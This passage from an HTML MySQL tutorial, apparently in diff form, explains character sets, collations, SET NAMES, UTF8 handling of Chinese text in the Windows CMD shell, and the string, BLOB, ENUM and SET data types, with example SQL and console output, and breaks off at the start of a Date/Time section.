+<p>A <em>character set</em> (also called <em>charset</em>, <em>character encoding</em>, <em>character map</em>, <em>code page</em>) defines a set of character and maps each character to a unique numeric code. For example, in ASCII, character <code>'A'</code> is assigned 65, <code>'a'</code> is 97, <code>'0'</code> is 48 and space is 32. The most commonly-used character sets are the 8-bit Latin-1 (ISO/IEC 8859-1) for English characters (which is backward compatible with 7-bit ASCII), and multi-byte Unicode (ISO/IEC 10646) for internationalization. Unicode can be encoded in variable-length UTF8 (1-3 bytes) for fixed-length UCS2 (2 bytes).</p>
+
+<p>For more details on character sets, read &quot;<a href="../java/DataRepresentation.html">A Tutorial on Data Representation - Integers, Floating-point Numbers, and Character Sets</a>&quot;, section &quot;<a href="../java/DataRepresentation.html#charencoding">Character Sets and Encoding Schemes</a>&quot;.</p>
+
+<p>MySQL's UCS-2 is in big-endian without BOM (Byte Order Mark), i.e., UCS-2BE or UTF2BE. MySQL uses no BOM for UTF-8.</p>
+
+<h5>Collating Sequences</h5>
+
+<p>A <em>collating sequence</em> (or <em>collation</em>) refers to the orders in which individual characters should be ranked in comparing or sorting the strings. In other words, a <em>collation</em> is a set of rules for ranking characters in a character set.</p>
+
+<p>A string may contain uppercase and lowercase characters, digits and symbols. As an example, suppose we wish to sort three strings: <code>&quot;apple&quot;</code>, <code>&quot;BOY&quot;</code>, and <code>&quot;Cat&quot;</code> encoded in ASCII. If we rank the characters according to the underlying ASCII code numbers, the order would be <code>&quot;BOY&quot;</code>, <code>&quot;apple&quot;</code> and  <code>&quot;Cat&quot;.</code> It is because uppercase letters have smaller code numbers than lowercase letters in ASCII code. Ranking strings according to their underlying code numbers is known as <em>binary collation</em>. Binary collation does not agree with the so-called <em>dictionary order</em>, where the same uppercase and lowercase letters have the same rank.</p>
+
+<p>There are many other collating sequences available. Some case-insensitive (<code>ci</code>) dictionary-order collating sequences have the same rank for the same uppercase and lowercase letter, i.e., <code>'A'</code>, <code>'a'</code> &rArr; <code>'B'</code>, <code>'b'</code> &rArr; ... &rArr; <code>'Z'</code>, <code>'z'</code>. Some case-sensitive (<code>cs</code>) dictionary-order collating sequences put the uppercase letter before its lowercase counterpart, i.e., <code>'A'</code> &rArr;<code>'a'</code> &rArr; <code>'B' &rArr;</code> <code>'b'</code> &rArr; ... &rArr; <code>'Z'</code> &rArr;<code> 'z'</code>. Typically, space is ranked before digits <code>'0'</code> to <code>'9'</code>, followed by the alphabets.</p>
+
+<p>Collating sequence is also language dependent, as different languages use different sets of characters, e.g., a, A, &alpha;, Ä, &aacute;, &eacute;. It becomes more complicated if more than one languages are used, e.g., you need to decide how to rank 'a' and '&alpha;', by choosing an appropriate collating sequence.</p>
+
+<h5>MySQL Character Sets and Collations</h5>
+<p>MySQL 5.5 supports 39 character sets with 197 collations.</p>
+<p> You could use command <code>SHOW CHARACTER SET</code> to display all the supported character sets and their default collation; and <code>SHOW COLLATION</code> to display all the collations and the charsets their support.</p>
+<pre class="color-example">
+mysql&gt; <strong>SHOW CHARACTER SET;</strong>
++----------+-----------------------------+---------------------+--------+
+| Charset  | Description                 | Default collation   | Maxlen |
++----------+-----------------------------+---------------------+--------+
+| latin1   | cp1252 West European        | latin1_swedish_ci   |      1 |
+| utf8     | UTF-8 Unicode               | utf8_general_ci     |      3 |
+| ucs2     | UCS-2 Unicode               | ucs2_general_ci     |      2 |
+| ascii    | US ASCII                    | ascii_general_ci    |      1 |
+  ......
+39 rows in set (0.06 sec)
+ 
+mysql&gt; <strong>SHOW COLLATION;</strong>
++--------------------------+----------+-----+---------+----------+---------+
+| Collation                | Charset  | Id  | Default | Compiled | Sortlen |
++--------------------------+----------+-----+---------+----------+---------+
+| big5_chinese_ci          | big5     |   1 | Yes     | Yes      |       1 |
+| big5_bin                 | big5     |  84 |         | Yes      |       1 |
+ ......
+197 rows in set (0.01 sec)</pre>
+
+<p>The default character set in MySQL is <code>latin1</code> (aka ISO-8859-1). The default collation for <code>latin1</code> is <code>latin1_swdish_ci</code>, which is a case-insensitive collation suitable for Swedish/finnish (MySQL was created by some Swedishs). You can list the available collations for <code>latin1</code>, as follows:</p>
+<pre class="color-example">
+mysql&gt; <strong>SHOW COLLATION LIKE 'latin1%';</strong>
++-------------------+---------+----+---------+----------+---------+
+| Collation         | Charset | Id | Default | Compiled | Sortlen |
++-------------------+---------+----+---------+----------+---------+
+| latin1_german1_ci | latin1  |  5 |         | Yes      |       1 |
+| latin1_swedish_ci | latin1  |  8 | Yes     | Yes      |       1 |
+| latin1_danish_ci  | latin1  | 15 |         | Yes      |       1 |
+| latin1_german2_ci | latin1  | 31 |         | Yes      |       2 |
+| latin1_bin        | latin1  | 47 |         | Yes      |       1 |
+| latin1_general_ci | latin1  | 48 |         | Yes      |       1 |
+| latin1_general_cs | latin1  | 49 |         | Yes      |       1 |
+| latin1_spanish_ci | latin1  | 94 |         | Yes      |       1 |
++-------------------+---------+----+---------+----------+---------+</pre>
+
+<p><code>latin1_general_ci</code> is a <em>case-insensitive</em> collation for multilingual western european. <code>latin1_general_cs</code> is <em>case-sensitive</em>. <code>latin1_bin</code> is the	<em>binary</em> collation according to <code>latin1</code> encoding.</p>
+<p>I recommend that you use <code>utf8</code> charset for applications that require internationalization (i18n) support (because <code>utf8</code> supports all the languages in this world). The default collation for <code>utf8</code> is <code>utf8_general_ci</code>. Other collations for <code>utf8</code> includes:</p>
+
+<pre class="color-example">
+mysql&gt; <strong>SHOW COLLATION LIKE 'utf8%';</strong>
++--------------------+---------+-----+---------+----------+---------+
+| Collation          | Charset | Id  | Default | Compiled | Sortlen |
++--------------------+---------+-----+---------+----------+---------+
+| utf8_general_ci    | utf8    |  33 | Yes     | Yes      |       1 |
+| utf8_bin           | utf8    |  83 |         | Yes      |       1 |
+| utf8_unicode_ci    | utf8    | 192 |         | Yes      |       8 |
+| utf8_icelandic_ci  | utf8    | 193 |         | Yes      |       8 |
+| utf8_latvian_ci    | utf8    | 194 |         | Yes      |       8 |
+| utf8_romanian_ci   | utf8    | 195 |         | Yes      |       8 |
+  ......</pre>
+
+<p>You may want to try out some of these collations by ranking space, numbers, uppercase and lowercase letters, and some typical strings.</p>
+
+<h5>Specifying Character Set and Collation in MySQL</h5>
+<p>You could specify the character set and  collation via keyword <code>CHARACTER SET</code> (or <code>CHARSET</code>) and <code>COLLATE</code>. They could be set at 4 levels: server, database, table, and column.</p>
+<p>To set the charset and collation for the server, start <code>mysqld</code> with <code>--character-set-server=<em>charset</em></code> and <code>--collation-server=<em>collation</em></code> options. The default charset is <code>latin1</code>.</p>
+<p>You can set the default charset and collation for an database in <code>CREATE DATABASE</code>. For example,</p>
+<pre class="color-command">
+CREATE DATABASE <em>databaseName</em>
+<strong>DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci</strong>;</pre>
+
+<p> You can set the character set and collation for table and column in <code>CREATE TABLE</code>. For example,</p>
+<pre class="color-command">
+CREATE TABLE IF NOT EXISTS StringArena (
+   cString1 VARCHAR(50) <strong>CHARACTER SET latin1 COLLATE latin1_general_cs</strong>,  <span class="color-comment">-- case-sensitive 'A' -&gt; 'a' -&gt; 'B' -&gt; 'b'</span>
+   cString2 CHAR(10) <strong>CHARACTER SET latin1</strong>,                               <span class="color-comment">-- default collation of latin1_swedish_ci</span>
+   cString3 TEXT
+) <strong>DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci</strong>;                    <span class="color-comment">-- case-insensitive 'A' and 'a' are the same</span></pre>
+<p>In the above example, the default character set for all the string columns for the table is <code>utf8</code> (for unicode support) with collating sequence of <code>utf8_unicode_ci</code> (default). However, column <code>cString1</code> uses character set <code>latin1</code> with collation <code>latin1_general_cs</code>; column <code>cString2</code> uses character set <code>Latin1</code> with default collation <code>latin1_swedish_ci</code> (not from table default but from the charset default); column <code>cString3</code> uses the default character set and collation of the table.</p>
+
+<p><span class="line-heading">Example (Testing Character Sets and Collations):</span> Read &quot;<code><a href="codes/charset_arena.sql.txt">charset_arena.sql</a></code>&quot;.</p>
+
+<h5>Character Set and Collation Related System Variables</h5>
+<p>There are quite a number of system variables related to charset and collation, with names starting with &quot;<code>character_set_</code>&quot; and &quot;<code>collation_</code>&quot;, respectively. You can list them as follows:</p>
+<pre class="color-example">
+mysql&gt; <strong>SHOW VARIABLES LIKE 'character\_set\_%';</strong>
+            <span class="color-comment">--  Use the escape <code>'\_'</code> for <code>'_'</code></span>
++--------------------------+--------+
+| Variable_name            | Value  |
++--------------------------+--------+
+| character_set_client     | latin1 |
+| character_set_connection | latin1 |
+| character_set_database   | latin1 |   <span class="color-comment">&lt;= default charset for database</span>
+| character_set_filesystem | binary |
+| character_set_results    | latin1 |
+| character_set_server     | latin1 |   <span class="color-comment">&lt;= default charset for server</span>
+| character_set_system     | utf8   |   <span class="color-comment">&lt;= meta-data</span>
++--------------------------+--------+
+7 rows in set (0.00 sec)
+   
+mysql&gt; <strong>SHOW VARIABLES LIKE 'collation\_%';</strong>
++----------------------+-------------------+
+| Variable_name        | Value             |
++----------------------+-------------------+
+| collation_connection | latin1_swedish_ci |
+| collation_database   | latin1_swedish_ci |  <span class="color-comment">&lt;= default collation for database</span>
+| collation_server     | latin1_swedish_ci |  <span class="color-comment">&lt;= default collation for server</span>
++----------------------+-------------------+
+3 rows in set (0.00 sec)</pre>
+
+<p>The system variables <code>character_set_server</code>, <code>character_set_database</code> and <code>collation_server</code>, <code>collation_database</code> maintain the default charset and collation for the server and the current database respectively.</p>
+<p>In MySQL, columns, tables, databases may use different character sets. However, the meta-data (such as column names and attributes) must be stored in the same character set, and include all languages. Hence, meta-data, by default, stored in UTF-8, as maintained in the system variable <code>character_set_system</code>.</p>
+
+<h5>Character Set for Client-Server Communication</h5>
+<p>A client connects to the server via a so-called <em>connection</em> object. The client sends the SQL statements over the connection to the server. The server returns the results via the connection to the client. Server maintains a connection for each client, and maintains connection-related character          set and collation system variables for each client connection.</p>
+<p>The client sends its statements using <code>character_set_client</code>. They are translated to <code>character_set_connection</code>, and uses <code>collation_connection</code> for comparing string literals. The server returns the results to the client using <code>character_set_results</code>. You can use command &quot;<code>SET NAMES <em>charset</em></code>&quot; (e.g., &quot;<code>SET NAMES 'utf8'</code>&quot;) to change the character set used for client-server communication. &quot;<code>SET NAMES</code>&quot;, in effect, changes system variables <code>character_set_client</code>, <code>character_set_connection</code>, and <code>character_set_results</code>. For example,</p>
+
+<pre class="color-example">
+<span class="color-comment">-- Default charset for client, connection, and results is latin1</span>
+mysql&gt; <strong>SHOW VARIABLES LIKE 'character\_set\_%';</strong>
++--------------------------+--------+
+| Variable_name            | Value  |
++--------------------------+--------+
+| <strong>character_set_client</strong>     | <strong>latin1</strong> |
+| <strong>character_set_connection</strong> | <strong>latin1</strong> |
+| character_set_database   | latin1 |
+| character_set_filesystem | binary |
+| <strong>character_set_results</strong>    | <strong>latin1</strong> |
+| character_set_server     | latin1 |
+| character_set_system     | utf8   |
++--------------------------+--------+
+7 rows in set (0.00 sec)
+   
+mysql&gt; <strong>SET NAMES 'utf8';</strong>
+Query OK, 0 rows affected (0.00 sec)
+   
+mysql&gt; <strong>SHOW VARIABLES LIKE 'character\_set\_%';</strong>
++--------------------------+--------+
+| Variable_name            | Value  |
++--------------------------+--------+
+| <strong>character_set_client</strong>     | <strong>utf8</strong>   |  <span class="color-comment">&lt;==</span>
+| <strong>character_set_connection</strong> | <strong>utf8</strong>   |  <span class="color-comment">&lt;==</span>
+| character_set_database   | latin1 |
+| character_set_filesystem | binary |
+| <strong>character_set_results</strong>    | <strong>utf8</strong>   |  <span class="color-comment">&lt;==</span>
+| character_set_server     | latin1 |
+| character_set_system     | utf8   |
++--------------------------+--------+
+7 rows in set (0.00 sec)</pre>
+
+<p>When a client (e.g., <code>mysql</code>, <code>mysqlshow</code>, <code>mysqladmin</code>) connects to the server, it sends the name of the character set that it wants to use to the server (default is <code>latin1</code>; or specify in <code>--default-character-set</code> startup option of the client). The server uses this name to set the <code>character_set_client</code>, <code>character_set_results</code>, and <code>character_set_connection</code> system variables for this client connection. In effect, the server performs a &quot;<code>SET NAMES</code>&quot;.</p>
+
+<h4>String Data Types</h4>
+<p>MySQL supports fixed-length and variable-length string types:</p>
+<ul>
+  <li><span class="line-heading font-code">CHAR(<em>n</em>)</span>: fix-length string of <em><code>n</code></em> characters, right-pad with spaces. The maximum <code><em>n</em></code> is 255 characters.</li>
+  <li><span class="line-heading font-code">VARCHAR(<em>n</em>)</span>: variable-length string of up to <em><code><em>n</em></code></em> characters. The maximum <em><code>n</code></em> is 65535 bytes of storage (<code>utf8</code> characters range from 1-4 bytes).</li>
+  <li><span class="line-heading font-code">TINYTEXT</span>: up to 255 Bytes</li>
+  <li><span class="line-heading font-code">TEXT</span>: up to 64 KBytes</li>
+  <li><span class="line-heading font-code">MEDIUMTEXT</span>: up to 16 MBytes</li>
+  <li><span class="line-heading font-code">LONGTEXT</span>: up to 4 GBytes</li>
+</ul>
+
+<p><span class="line-heading">Example:</span> [TODO]</p>
+
+<h5>String Literals and String Introducer</h5>
+
+<p>A string literal has on optional charset <em>introducer </em>and collate clause. The introducer tells the parser that the string that is followed uses a certain character set.</p>
+
+<pre class="color-example">
+<span class="color-comment">// Syntax</span>
+[_charsetName]'string' [COLLATE collationName]
+ 
+<span class="color-comment">// Example</span>
+SELECT 'Test String';
+SELECT _latin1'Test String';
+SELECT _latin1'Test String' COLLATE ...
+ 
+SELECT HEX('abc');         <span class="color-comment">-- 616263</span>
+SELECT _latin1 x'616263';  <span class="color-comment">-- 'abc': can express string in hex code</span>
+SELECT HEX(_utf8'abc');    <span class="color-comment">-- 616263</span>
+</pre>
+
+<h5><span class="font-code">CONVERT(... USING ...)</span> Function</h5>
+<p><code>CONVERT(expr USING charset)</code> can be used to convert string between different character sets, e.g.,</p>
+<pre class="color-example">
+SELECT CONVERT(_latin1'....' USING utf8);
+INSERT INTO utf8Table (utf8Column) VALUES
+   ((SELECT CONVERT(latin1Column USING utf8) FROM latin1Table)));</pre>
+
+<p>String introducer merely <em>interpret</em>s the string literal and does not change its value; whereas <code>CONVERT</code>() returns a new value of the specified type. For example,</p>
+
+<pre class="color-example">
+<span class="color-comment">-- default charset is latin1</span>
+ 
+mysql&gt; SELECT HEX(CONVERT('abc' USING ucs2));
++--------------------------------+
+| HEX(CONVERT('abc' USING ucs2)) |
++--------------------------------+
+| 006100620063                   |
++--------------------------------+
+    <span class="color-comment">-- Returns a new UCS2 representation.
+    -- Each character in UCS2 takes two bytes</span>
+ 
+mysql&gt; SELECT HEX(_ucs2'abc'), _ucs2'abc';
++-----------------+-----+
+| HEX(_ucs2'abc') | ?   |
++-----------------+-----+
+| 00616263        | ??  |
++-----------------+-----+
+    <span class="color-comment">-- Interpret 'abc' (or x'616263') as two UCS2 characters</span></pre>
+
+
+<h4>UTF8 Charset</h4>
+<p>For internationalization, UTF8 charset shall be used.</p>
+
+<h5>UTF8-Encoded Chinese Characters in Windows' CMD Shell</h5>
+
+<p>In brief, do not use CMD shell to work on UTF8 charset. Use a tool such as NetBeans, Eclipse, MySQL workbench or PhpMyAdmin which fully supports UTF8 charset.</p>
+
+<p>If you want to display a text file encoded in a particular character set (e.g., ASCII, Latin1, UTF8) in CMD correctly, you need to choose a matching &quot;codepage&quot;. For example, ANSI/Latin1 requires codepage 1252, Simplified Chinese GBK (GB2312) requires 936, UTF8 requires 65001, UCS2LE requires 1200, UCS2BE requires 1201, and the original DOS extended-ASCII uses codepage 437.</p>
+<p>CMD is NOT able to detect the character set automatically and switch to the matching codepage.  To set the codepage in CMD, issue command &quot;<code>chcp <em>color-page-number</em></code>&quot;, e.g. &quot;<code>chcp 65001</code>&quot; to choose UTF8 codepage. This codepage could display UTF8 text correctly, and display garbage if the text is encoded using other character set, including UCS2, GB2312.</p>
+<p>You also have to choose a font (such as Consolas, Lucida Console, but NOT raster font) that supports the characters. To choose the font for CMD, click on the CMD icon &rArr; &quot;Properties&quot; &rArr; &quot;Font&quot;.</p>
+
+<p>There are a number of character encoding schemes for Chinese characters, e.g., Unicode (UTF8, UCS2GE, UCS2LE), GB2312, GBK and BIG5, which are not compatible. Read &quot;<a href="../java/DataRepresentation.html">A Tutorial on Data Representation</a>&quot; Section &quot;<a href="../java/DataRepresentation.html#chinese_charset">Chinese Character Sets</a>&quot; for more details.</p>
+
+<p>Unicode is an international standard, which supports all languages, including Chinese, Japanese and Korean (CJK). Unicode has two frequently-used encoding schemes: UTF8 (1-3 bytes variable-length, the 1-byte codes are backward-compatible with ASCII) and UCS2 (2 byte fixed-length). UTF8 is ideal if your text consists of mainly ASCII (English text), with occasional non-ASCII text. I strongly recommend using UTF8 character set for MySQL columns that require internationalization support. GB2312 is a Chinese national standard for simplified chinese, it is not compatible with UCS2 or UTF8. For example, for the chinese characters &quot;您好&quot;, the UCS2 is &quot;<code>60A8 597D</code>&quot;, the UTF8 is &quot;<code>E682A8  E5A5BD</code>&quot;, the GB1232 is &quot;<code>C4FA BAC3</code>&quot;.</p>
+<p>Unfortunately, in CMD, the Microsoft Pinyin IME  (MSPY), the Chinese character input tool, is disabled for codepage 65001 (UTF8) (?!?!). MSPY works on GB2312 (codepage 936). If you run your MySQL client in CMD, using codepage 936 (GB2312) so that you can input chinese characters (e.g., for <code>INSERT</code> and <code>UPDATE</code>), but your database character columns are using UTF8, you need to handle this situation with great care.</p>
+<p>In MySQL client, you can issue the command &quot;<code>SET NAMES <em>'charset</em></code>'&quot; to specify the character set used for the client/server communication. (Alternatively, you could start <code>'mysql'</code> client with the <code>--default-character-set=<em>charset</em></code> option.)</p>
+<p>In the above situation, you need to issue &quot;<code>SET NAMES 'gb2312'</code>&quot;, as your input is encoded in GB2312, which is sent to the server. The server receives the characters in GB2312, converts them into the character set defined for the column, which is UTF8, before storing them. During query, the server retrieves the characters from the columns in UTF8, convert to GB2312 (according to the <code>SET NAMES</code>), and send to the client in CMD, which uses codepage 936 to correctly display the text. Try the following commands:</p>
+<pre class="color-example">
+mysql&gt; <strong>SET NAMES 'gb2312';</strong>
+Query OK, 0 rows affected (0.00 sec)
+   
+mysql&gt; <strong>SHOW VARIABLES LIKE 'character\_set\_%';</strong>
++--------------------------+--------+
+| Variable_name            | Value  |
++--------------------------+--------+
+| <strong>character_set_client</strong>     | <strong>gb2312</strong> |
+| <strong>character_set_connection</strong> | <strong>gb2312</strong> |
+| character_set_database   | latin1 |
+| character_set_filesystem | binary |
+| <strong>character_set_results</strong>    | <strong>gb2312</strong> |
+| character_set_server     | latin1 |
+| character_set_system     | utf8   |
++--------------------------+--------+
+7 rows in set (0.00 sec)</pre>
+
+<p>Observe that <code>SET NAMES</code> affects the <code>character_set_client</code>, <code>character_set_connection</code>, and <code>character_set_results</code>.</p>
+
+<p>Suppose that you interacts with the server via a Java program, written in Eclipse or others. You should set the encoding to UTF8, and include &quot;<code>SET NAMES 'utf8'</code>&quot; in your MySQL script.</p>
+<p>Similarly, suppose that you are running a SQL script in batch mode or using source command in CMD, and your script in encoded in UTF8, then you should include &quot;<code>SET NAMES 'utf8'</code>&quot; in the script (&quot;<code>SET NAMES 'gb2312'</code>&quot; results in garbage inserted into the database). But to query interactively in CMD using code page 936, you need to &quot;<code>SET NAMES 'gb2312'</code>&quot; to convert UTF8 to GB2312 (cp936).</p>
+<p>I would expect that, in CMD using codepage 65001, I could display the UTF8 column from MySQL correctly with &quot;<code>SET NAMES 'utf8'</code>&quot;. But it does not work in my computer (?!?!).</p>
+
+<p>Take note that you could use <code>HEX()</code> function to request the hex code of the characters, stored in the database.</p>
+<pre class="color-command">
+SELECT `id`, `description`, <strong>HEX(`description`)</strong> FROM `ChineseUtf8Arena` ORDER BY `description`, `id`;</pre>
+
+<p><span class="line-heading">Example (Testing UTF8-encoded Chinese  Characters):</span> Read &quot;<a href="codes/chinese_utf8_arena.sql.txt"><code>chinese_utf8_arena.sql</code></a>&quot;.</p>
+
+<h5>Notes on Using UTF8-Encoded Characters in Eclipse/Java</h5>
+<ol>
+<li>Open Run Dialog &rArr; &quot;your application&quot; &rArr; Common Tab &rArr; Console Encoding &rArr; Other &rArr; &quot;set it to UTF-8&quot;.</li>
+
+<li>Open Run Dialog &rArr; &quot;your application&quot; &rArr; Arguments Tab &rArr; VM Arguments &rArr; Add &quot;<code>-Dfile.encoding=UTF-8</code>&quot;; or add &quot;<code>-Dfile.encoding=UTF-8</code>&quot; to &quot;<code>eclipse.ini</code>&quot;.</li>
+
+<li>Window Menu &rArr; General &rArr; Workspace &rArr; Text file encoding &rArr; set to &quot;UTF-8&quot;.</li>
+</ol>
+
+<h4>Binary Data and BLOB</h4>
+<p>MySQL support both character string (a sequence of characters) and binary string (a sequence of bytes). Binary data (e.g., images and codes) are special string with character set of <code>binary</code>, that is, all characters are treated as binary raw bytes.</p>
+<ul>
+  <li><span class="line-heading font-code">BINARY(<em>n</em>)</span>: Similar to <code>CHAR(<em>n</em>)</code>, but store binary data with fixed-length of <code><em>n</em></code> bytes.</li>
+  <li><span class="line-heading font-code">VARBINARY(<em>n</em>)</span>: Similar to <code>VARCHAR(<em>n</em>)</code>, but store binary data of variable-length of up to <code><em>n</em></code> bytes.</li>
+  <li><span class="line-heading font-code">TINYBLOB</span>: up to 255 bytes</li>
+  <li><span class="line-heading font-code">BLOB</span>: up to 64KBytes</li>
+  <li><span class="line-heading font-code">MEDIUMBLOB</span>: up to 16MBytes</li>
+  <li><span class="line-heading font-code">LONGBOLB</span>: up to 4GBytes</li>
+</ul>
+
+<p><span class="line-heading">Example:</span> The <code>LOAD_FILE()</code> function, which reads from a file and returns a string, can be used to load a <code>BLOB</code>/<code>TEXT</code> field with a binary/text file.</p>
+<pre class="color-example">
+CREATE TABLE IF NOT EXISTS `blob_arena` (
+   `id`     INT UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT,
+   `photo`  BLOB,
+    PRIMARY KEY(`ID`)
+);
+   
+INSERT INTO `blob_arena` (`photo`) VALUES (LOAD_FILE('d:/path/test.jpg'));</pre>
+
+<p><span class="line-heading">Example:</span> Storing a thumbnail image [Refer to Rental Database Example].</p>
+<h4>ENUM</h4>
+<p><code>ENUM</code> is a special string type. An <code>ENUM</code> (or enumeration) is a string with a value chosen from a list of allowed values (or members). The list of allowed values are defined explicitly in the column definition of the <code>CREATE TABLE</code> command. For example,</p>
+<pre class="color-command">
+CREATE TABLE Shoes (
+   brand           ENUM('abc', 'xyz', 'qqq');
+   size            ENUM('S', 'M', 'L', 'XL', 'XXL');
+   customerRating  ENUM('1', '2', '3', '4', '5');
+);</pre>
+<p>The value must be a quoted string literal. Duplicate values are not allowed. <code>NULL</code> is allowed only if the column is declared to allow <code>NULL</code>. If you insert a value not in the <code>ENUM</code> list, an empty string (<code>''</code>) would be inserted, which signals an error value. </p>
+<p>Each <code>ENUM</code> type is associated with an index, beginning with 1 for the first allowable value. The empty string has index of 0 (to denotes an error value). The index of <code>NULL</code> is <code>NULL</code>.</p>
+<p>ENUM is typically represented in 16-bit, which allows 65,535 members.</p>
+
+<p><span class="line-heading">Example (Testing <span class="font-code">ENUM</span> Type):</span></p>
+<ol>
+  <li>Create a table with <code>ENUM</code> columns. Observe that <code>ENUM</code>'s values are quoted string literals. Numbers must be stored as quoted strings.
+  <pre class="color-example">
+<strong>CREATE TABLE IF NOT EXISTS `enum_arena` (
+   `desc`            VARCHAR(50) NULL,
+   `brand`           ENUM('abc', 'xyz', 'qqq') NOT NULL DEFAULT 'qqq',
+   `size`            ENUM('S', 'M', 'L', 'XL', 'XXL') NOT NULL,
+   `customerRating`  ENUM('5', '4', '3', '2', '1') DEFAULT NULL
+);</strong>
+  
+<strong>DESCRIBE `enum_arena`;</strong>
++----------------+------------------------------+------+-----+---------+-------+
+| Field          | Type                         | Null | Key | Default | Extra |
++----------------+------------------------------+------+-----+---------+-------+
+| desc           | varchar(50)                  | YES  |     | NULL    |       |
+| brand          | enum('abc','xyz','qqq')      | NO   |     | qqq     |       |
+| size           | enum('S','M','L','XL','XXL') | NO   |     | NULL    |       |
+| customerRating | enum('5','4','3','2','1')    | YES  |     | NULL    |       |
++----------------+------------------------------+------+-----+---------+-------+</pre>
+
+</li>
+<li>Insert values into <code>ENUM</code> fields. Check case-sensitivity and values not in the enum list. Observe that the <code>ENUM</code> string is NOT case-sensitive (in MySQL). Empty string (<code>''</code>), denoting erroneous value, would be inserted for value not in the <code>ENUM</code> list.
+
+<pre class="color-example">
+<strong>INSERT INTO `enum_arena` 
+   (`description`, `brand`, `size`)
+VALUES
+   ('Valid value', 'abc', 'm'),
+   ('Uppercase value', 'XYZ', 'M'),
+   ('Invalid value', 'qqq', 'unknown');</strong>
+   
+<strong>UPDATE `enum_arena` SET customerRating='3';</strong>
+   
+<strong>SELECT * FROM `enum_arena`;</strong>
++-----------------+-------+------+----------------+
+| description     | brand | size | customerRating |
++-----------------+-------+------+----------------+
+| Valid value     | abc   | M    | 3              |
+| Uppercase value | xyz   | M    | 3              |
+| Invalid value   | qqq   |      | 3              |
++-----------------+-------+------+----------------+</pre>
+
+</li>
+
+  <li>Using numeric index as <code>ENUM</code>'s value: Instead of the literal string value, you could also use the numeric index associated with each <code>ENUM</code> type. The numeric index begins at 1, for the first value is the list.
+
+    <pre class="color-example">
+<strong>INSERT INTO `enum_arena` VALUES
+   ('Use numeric index', 'qqq', 2, 1);</strong>
+   
+<strong>SELECT * FROM `enum_arena` WHERE `description`='Use numeric index';</strong>
++-------------------+-------+------+----------------+
+| description       | brand | size | customerRating |
++-------------------+-------+------+----------------+
+| Use numeric index | qqq   | M    | 5              |
++-------------------+-------+------+----------------+</pre>
+
+</li>
+<li>Selecting the error records: The empty string (erroneous value) has index of 0 (error code). You could use the error index of 0 to retrieve the erroneous records as follows.
+  <pre class="color-example">
+<strong>SELECT * FROM Shirts WHERE brand=0 OR size=0 OR customerRating=0;</strong>
++-------+------+----------------+
+| brand | size | customerRating |
++-------+------+----------------+
+| qqq   |      | 3              |
++-------+------+----------------+</pre>
+</li>
+
+  <li>To retrieve all the allowable values of an <code>ENUM</code>, you could query the MySQL system <code>database information_schema</code>, table <code>columns</code>, as follows:
+
+<pre class="color-example">
+<strong>SELECT column_type FROM information_schema.columns
+WHERE table_schema='test' AND table_name='enum_arena' AND column_name='brand';</strong>
++-------------------------+
+| column_type             |
++-------------------------+
+| enum('abc','xyz','qqq') |
++-------------------------+</pre>
+
+</li>
+
+</ol>
+<h4>SET</h4>
+<p><code>SET</code> is also a special string type. <code>SET</code> is similar to <code>ENUM</code>, but you could choose zero (empty string) or more values from the allowable values; or <code>NULL</code> if configured. For a <code>SET</code> (<code>'a'</code>, <code>'b'</code>, <code>'c'</code>), the valid values are <code>''</code> (empty string), <code>'a'</code>, <code>'b'</code>, <code>'c'</code>, <code>'a,b'</code>, <code>'a,c'</code>, <code>'b,c'</code> and <code>'a,b,c'</code>. Commas are used to delimit multiple values, with no spaces around the commas.</p>
+<p> A set can have a maximum of 64 members. In MySQL, a set values are stored as a 64-bit integer, with the least-significant bit corresponding to the first member. For example, for a <code>SET</code> (<code>'a'</code>, <code>'b'</code>, <code>'c'</code>), selected numeric value are:</p>
+
+<table class="table-zebra" style="width:60%">
+  <tr>
+    <th>SET member</th>
+    <th>Binary Value</th>
+    <th>Decimal Value</th>
+  </tr>
+  <tr>
+    <td><code>'a'</code></td>
+    <td>001</td>
+    <td>1</td>
+  </tr>
+  <tr class="tr-alt">
+    <td><code>'b'</code></td>
+    <td>010</td>
+    <td>2</td>
+  </tr>
+  <tr>
+    <td><code>'c'</code></td>
+    <td>100</td>
+    <td>4</td>
+  </tr>
+  <tr class="tr-alt">
+    <td><code>''</code></td>
+    <td>000</td>
+    <td>0</td>
+  </tr>
+  <tr>
+    <td><code>'a,b,c'</code></td>
+    <td>111</td>
+    <td>7</td>
+  </tr>
+</table>
+<p>Similar to <code>ENUM</code>, you can use the numeric value.</p>
+
+<p><span class="line-heading">Example (Testing <span class="font-code">SET</span> Data Type):</span> Read &quot;<code><a href="codes/set_arena.sql.txt">set_arena.sql</a></code>&quot;.</p>
+<p>[TODO] Explanation.</p>
+<h4>Date/Time</h4>
+<p>Date and time (as well as currency) are of particular interest for database applications. It is because business records often carry date/time information (e.g., <code>orderDate</code>, <code>deliveryDate</code>, <code>paymentDate</code>), as well as the need to time-stamp the last update of the records for auditing and security.</p>
+<p>MySQL provides these built-in functions for getting the <em>current</em> date and/or time:</p>
+<ul>
+  <li><span class="line-heading font-code">NOW()</span>: returns the current date and time in the format of <span class="line-heading font-code">'YYYY-MM-DD HH:MM:SS'</span>.</li>
+  <li><span class="line-heading font-code">CURDATE()</span> (or <span class="line-heading font-code">CURRENT_DATE()</span>, or <span class="line-heading font-code">CURRENT_DATE</span>): returns the current date in the format of <span class="line-heading font-code">'YYYY-MM-DD'</span>.</li>
+  <li><span class="line-heading font-code">CURTIME()</span> (or <span class="line-heading font-code">CURRENT_TIME()</span>, or <span class="line-heading font-code">CURRENT_TIME</span>): returns the current time in the format of <span class="line-heading font-code">'HH:MM:SS'</span>.</li>
+</ul>
+<p>For examples,</p>
+<pre class="color-example">
+mysql&gt; <strong>select now(), curdate(), curtime();</strong>
++---------------------+------------+-----------+
+| now()               | curdate()  | curtime() |
++---------------------+------------+-----------+
+| 2010-04-08 16:28:06 | 2010-04-08 | 16:28:06  |
++---------------------+------------+-----------+</pre>
+<p>MySQL provides these date/time data type:</p>
+<ul>
